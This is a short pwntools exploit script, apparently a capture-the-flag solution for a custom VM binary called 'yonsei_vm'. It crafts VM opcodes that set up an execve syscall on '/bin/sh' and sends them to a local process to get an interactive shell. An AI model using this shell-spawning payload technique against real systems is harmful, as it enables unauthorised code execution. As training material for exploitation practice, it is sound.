from pwn import *

p = process('./yonsei_vm')

rax = 0xf
rdi = 0xe
rsi = 0x3
rdx = 0x1
rcx = 0x9
r8 = 0x0
r9 = 0x4
binsh = 0x4043d0

push = lambda val: b'\x06' + p64(val)
pop = lambda reg: b'\x07' + p8(reg)
mov = lambda reg, val: b'\x04' + p8(reg) + p64(val)
syscall = b'\xff'
hlt = b'\xf4'

pay = hlt
pay += mov(rdi, binsh)
pay += mov(rsi, 0)
pay += mov(rdx, 0)
pay += mov(rcx, 0)
pay += mov(r8, 0)
pay += mov(r9, 0)
pay += mov(rax, 59)
pay += syscall
pay = pay.ljust(0x1f0, b'\x00')
pay += b'/bin/sh' + b'\x00'*9
p.send( pay + b'\xe1')
p.interactive()
